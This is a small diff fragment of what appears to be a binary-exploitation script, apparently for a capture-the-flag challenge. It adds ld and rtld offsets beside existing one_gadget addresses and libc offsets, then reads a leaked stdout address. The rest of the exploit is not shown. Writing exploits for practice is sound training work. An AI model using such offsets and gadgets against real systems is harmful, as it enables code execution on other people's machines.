@@ -16,6 +16,8 @@ else :
     one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
     stdout_offset = 0x3c5620
     libc_main_offset = 0x20740
+    ld_offset = 0x5ef000
+    rtld_offset = 0x1040
     lock_recur_offset = 0x5f0f48
 
 p.recvuntil("stdout: ")
